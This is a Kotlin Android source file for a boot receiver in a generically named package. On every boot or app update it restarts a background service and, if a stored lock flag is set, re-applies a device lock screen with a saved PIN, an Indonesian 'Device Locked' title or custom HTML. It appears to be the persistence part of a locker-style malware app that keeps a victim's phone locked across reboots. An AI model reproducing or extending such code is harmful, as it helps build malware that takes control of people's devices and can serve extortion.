package com.sync.xxx

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val allowed = listOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_MY_PACKAGE_REPLACED
        )
        if (intent.action !in allowed) return
        ContextCompat.startForegroundService(
            context,
            Intent(context, DeviceService::class.java)
        )

        val prefs = context.getSharedPreferences("lock_state", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("locked", false)) return

        val type  = prefs.getString("lock_type",  "device") ?: "device"
        val pin   = prefs.getString("lock_pin",   "") ?: ""
        val title = prefs.getString("lock_title", "Perangkat Terkunci") ?: "Perangkat Terkunci"
        val html  = prefs.getString("lock_html",  "") ?: ""
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            val cmd = when (type) {
                "v3"     -> "lockV3"
                "custom" -> "lockCustom"
                else     -> "lockDevice"
            }
            val value = when (type) {
                "custom" -> html
                else     -> org.json.JSONObject().apply {
                    put("pin",   pin)
                    put("title", title)
                }.toString()
            }
            val cmdIntent = Intent(DeviceService.ACTION_COMMAND).apply {
                putExtra(DeviceService.EXTRA_COMMAND, cmd)
                putExtra(DeviceService.EXTRA_VALUE,   value)
                setPackage(context.packageName)
            }
            context.sendBroadcast(cmdIntent)
        }, 3000L)
    }
}